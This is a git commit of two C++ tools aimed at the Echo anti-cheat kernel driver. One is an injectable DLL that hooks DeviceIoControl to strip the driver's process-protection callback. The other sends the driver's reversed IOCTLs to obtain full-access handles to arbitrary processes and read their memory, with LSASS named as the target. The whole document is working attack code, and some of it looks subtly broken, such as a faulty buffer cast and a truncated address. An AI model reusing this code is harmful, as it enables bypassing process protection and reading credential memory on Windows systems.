b7efdf59f1341a95935563e8009a817c460d8044
eternal <45088542+git-eternal@users.noreply.github.com>
2022-09-04 14:44:15 -0700

    base

---
+++ echo hooker/echo hooker/dllmain.cpp
@@ -0,0 +1,176 @@
+#include <iostream>
+#include <windows.h>
+#include <winternl.h>
+#include <MinHook.h>
+#include <mutex>
+
+using ulong = DWORD;
+
+namespace echo::structs
+{
+  struct OpenProcessPacket
+  {
+    DWORD proc_id;
+    DWORD access;
+
+    void* handle_out;
+
+    bool success; int unk_1;
+  };
+
+  struct VerifySignature
+  {
+    PUCHAR pb_sig;
+    ulong cb_sig;
+
+    char pad[4];
+
+    bool success; ulong unk;
+  };
+
+  struct ObRegisterCallback
+  {
+    ulong pid;
+    ulong pid2;
+    int64_t unk1;
+    bool success;
+    ulong self_proc_id;
+  };
+}
+
+namespace echo::detours
+{
+  decltype(&DeviceIoControl) o_DeviceIoControl;
+
+  HANDLE driver_handle{};
+
+  BOOL __stdcall d_DeviceIoControl(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize,
+    LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped)
+  {
+    static std::once_flag flag{};
+
+    // get global handle
+    //
+    std::call_once(flag, [&]()
+      {
+        if (hDevice != INVALID_HANDLE_VALUE)
+        {
+          driver_handle = hDevice;
+          printf("[+] Obtained driver handle: 0x%p\n", &driver_handle);
+        }
+      });
+
+    if (dwIoControlCode == 0x9e6a0594)
+    {
+      printf("[DeviceIoControl]: Intercepted verify signature IOCTL\n");
+
+      auto packet = (echo::structs::VerifySignature*)lpInBuffer;
+
+      std::wcout << "Signature [PB]: " << packet->pb_sig << '\n';
+      std::cout << "Signature [CB]: " << packet->cb_sig << '\n';
+      std::cout << "Success [should be 0]: " << packet->success << '\n';
+
+      std::cout << '\n';
+    }
+    
+    // obregistercallback
+    if (dwIoControlCode == 0x252e5e08)
+    {
+      printf("[DeviceIoControl]: Intercepted ObReigsterCallback IOCTL\n");
+
+      auto packet =  (echo::structs::ObRegisterCallback*)lpInBuffer;
+
+      std::cout << "Pid1: " << packet->pid << '\n';
+      std::cout << "Pid2: " << packet->pid2 << '\n';
+      std::cout << "Self_proc_id: " << packet->self_proc_id << '\n';
+
+      packet->pid = 0; // dont protect echo.exe lol
+      packet->success = true;
+
+      printf("[+] Successfully stripped ObRegisterCallback\n");
+    }
+
+    //{
+    //  printf("\thDevice => %p\n", hDevice);
+    //  printf("\tdwIoControlCode => 0x%x\n", dwIoControlCode);
+    //  printf("\tlpInBuffer => %p\n", lpInBuffer);
+    //  printf("\tnInBufferSize => %u\n", nInBufferSize);
+    //}
+
+    return o_DeviceIoControl(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize, lpOutBuffer, nOutBufferSize, lpBytesReturned, lpOverlapped);
+  }
+
+  decltype(&CreateFileA) o_CreateFileA;
+
+  HANDLE __stdcall d_CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+    DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
+  {
+    //printf("Enter CreateFileA Detour\n");
+
+    //{
+    //  printf("\tlpFileName => %s\n", lpFileName);
+    //  printf("\tdwDesiredAccess => %x\n", dwDesiredAccess);
+    //  printf("\tdwShareMode => %x\n", dwShareMode);
+    //  printf("\tlpSecurityAttributes => %p\n", lpSecurityAttributes);
+    //  printf("\tdwCreationDisposition => %x\n", dwCreationDisposition);
+    //  printf("\tdwFlagsAndAttributes => %x\n", dwFlagsAndAttributes);
+    //  printf("\thTemplateFile => %p\n", hTemplateFile);
+    //}
+
+    //printf("Calling CreateFileA original\n\n");
+
+    return o_CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
+  }
+}
+
+namespace echo::context
+{
+#pragma warning (disable:26812)
+
+  bool install_hooks() noexcept
+  {
+    if (MH_Initialize() != MH_OK)
+      return false;
+
+    if (MH_CreateHook(&DeviceIoControl, detours::d_DeviceIoControl, (void**)&detours::o_DeviceIoControl) != MH_OK)
+      return false;
+
+    if (MH_CreateHook(&CreateFileA, detours::d_CreateFileA, (void**)&detours::o_CreateFileA) != MH_OK)
+      return false;
+
+    return MH_EnableHook(MH_ALL_HOOKS) == MH_OK;
+  }
+
+#pragma warning (default:26812)
+
+  void initialize() noexcept
+  {
+    {
+      AllocConsole();
+
+      _iobuf* data = { };
+
+      freopen_s(&data, "conin$", "r", stdin);
+      freopen_s(&data, "conout$", "w", stdout);
+    }
+
+    if (!install_hooks())
+      MessageBoxA(nullptr, "Failed to install hooks", nullptr, 0u);
+  }
+}
+
+bool __stdcall DllMain(void*, uint32_t reason, void*)
+{
+  using namespace echo;
+
+  if (reason != DLL_PROCESS_ATTACH)
+    return false;
+
+  const auto thread = CreateThread(nullptr, 0ull, (LPTHREAD_START_ROUTINE)
+    context::initialize, nullptr, 0ul, nullptr);
+
+  if (thread)
+    CloseHandle(thread);
+
+  return true;
+}
---
+++ echo reversal/echo-reversal/main.cpp
@@ -0,0 +1,216 @@
+#include <iostream>
+
+#include <windows.h>
+#include <winternl.h>
+
+// DeviceIoControl codes
+
+#define ECHODRV_VERIFY_SIGNATURE  CTL_CODE(0x9E6A, 0x165, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define ECHODRV_REGISTER_CALLBACK CTL_CODE(0x252E, 0x782, METHOD_BUFFERED, FILE_READ_ACCESS)
+#define ECHODRV_READ_MEMORY       CTL_CODE(0x60A2, 0x849, METHOD_BUFFERED, FILE_READ_ACCESS)
+#define ECHODRV_OBTAIN_HANDLE     CTL_CODE(0xE622, 0x92, METHOD_BUFFERED, FILE_READ_ACCESS)
+
+// CreateFileA flags
+
+#define ECHODRV_DESIRED_ACCESS 0xC0000000
+#define ECHODRV_SHARE_MODE     0x3
+#define ECHODRV_CREATION_DISP  0x3
+
+using ulong = DWORD;
+
+namespace echo::structs
+{
+	struct VerifySignature
+	{
+		PUCHAR pb_sig;
+		ulong cb_sig;
+
+		char pad[4];
+
+		bool success; ulong unk;
+	};
+
+	struct RegisterCallback
+	{
+		ulong proc_id;
+		ulong proc_id2;
+
+		int64_t unk_1;
+
+		bool success;
+		ulong self_proc_id;
+	};
+
+	struct ReadMemory
+	{
+		void* handle;
+
+		void* read_address;
+		void* read_buffer;
+
+		int64_t buffer_size;
+		int64_t bytes_out;
+
+		bool success; int unk_1;
+	};
+
+	struct ObtainHandle
+	{
+		ulong proc_id;
+		ulong access;
+
+		void* handle_out;
+
+		bool success; int unk_1;
+	};
+}
+
+namespace echo::driver
+{
+	void* attached_handle = { };
+	void* handle = { };
+
+	bool initialize() noexcept
+	{
+		handle = CreateFileA("\\\\.\\EchoDrv", ECHODRV_DESIRED_ACCESS,
+			ECHODRV_SHARE_MODE, 0ul, ECHODRV_CREATION_DISP, 0ul, nullptr);
+
+		return handle != nullptr;
+	}
+
+#pragma warning (disable:6273)
+
+	template <typename Type>
+	bool call_driver(const ulong& dispatch_id, Type& packet) noexcept
+	{
+		printf("Calling DeviceIoControl [%x] [%p, %zd]\n", dispatch_id, &packet, sizeof(packet));
+
+		return DeviceIoControl
+		(
+			handle, dispatch_id, &packet, sizeof(packet), &packet, sizeof(packet), nullptr, nullptr
+		);
+	}
+
+#pragma warning (default:6273)
+
+	/*
+	After I hooked DeviceIoControl on the main Echocm
+	executable, I saw that 'verify_signature' is being called first.
+
+	NOTE: VerifySignature status seems to be 0.
+	*/
+
+	bool verify_signature() noexcept
+	{
+		structs::VerifySignature packet = { };
+
+		const auto status = call_driver<structs::VerifySignature>
+			(ECHODRV_VERIFY_SIGNATURE, packet);
+
+		{
+			printf("\tReturn from VerifySignature [%d]\n", packet.success);
+		}
+
+		return status;
+	}
+
+	bool register_callback(const ulong& proc_id, const ulong& proc_id2) noexcept
+	{
+		structs::RegisterCallback packet = { };
+
+		{
+			packet.proc_id = proc_id;
+			packet.proc_id2 = proc_id2;
+		}
+
+		const auto status = call_driver<structs::RegisterCallback>
+			(ECHODRV_REGISTER_CALLBACK, packet);
+
+		{
+			printf("\tReturn from RegisterCallback [%d]\n", packet.success);
+		}
+
+		return status;
+	}
+
+	template <typename Type>
+	void read_memory(const ulong address, size_t size)
+	{
+		structs::ReadMemory packet = { };
+
+		Type    buffer = { };
+		int64_t bytes = { };
+
+		{
+			packet.read_address = (void*)address;
+			packet.handle = attached_handle;
+
+			packet.read_buffer = (void*)buffer;
+
+			packet.buffer_size = size;
+			packet.bytes_out = bytes;
+		}
+
+		(void)call_driver<structs::ReadMemory>
+			(ECHODRV_READ_MEMORY, packet);
+
+		std::cout << "ReadMemory called " << buffer << '\n';
+	}
+
+	bool obtain_handle(const ulong& proc_id)
+	{
+		structs::ObtainHandle packet = { };
+
+		{
+			packet.proc_id = proc_id;
+			packet.access = PROCESS_ALL_ACCESS;
+		}
+
+		const auto status = call_driver<structs::ObtainHandle>
+			(ECHODRV_OBTAIN_HANDLE, packet);
+
+		{
+			attached_handle = packet.handle_out;
+		}
+
+		{
+			printf("\tReturned from ObtainHandle [%d]\n", packet.success);
+			printf("\tAttached handle [0x%p]\n", packet.handle_out);
+		}
+
+		return status;
+	}
+}
+
+constexpr ulong lsass = 980ul;
+
+int main(int argc, char** argv)
+{
+	using namespace echo;
+
+	if constexpr (lsass > 0)
+	{
+		if (!driver::initialize())
+			printf("Failed to initialize driver [%d]\n", GetLastError());
+
+		if (!driver::verify_signature())
+			printf("Failed to verify signature [%d]\n", GetLastError());
+		if (!driver::obtain_handle(9904))
+			printf("Failed to obtain handle [%d]\n", GetLastError());
+
+		if (!driver::register_callback(GetCurrentProcessId(), 9904))
+			printf("Failed to register callback [%d]\n", GetLastError());
+
+
+		printf("Attached handle [%p]\n\n", driver::attached_handle);
+
+		driver::read_memory<int>((ulong)0x000000AD0637FA40, sizeof(int));
+
+	}
+	else
+	{
+		printf("Please enter valid lsass process ID\n");
+	}
+
+	return getchar();
+}
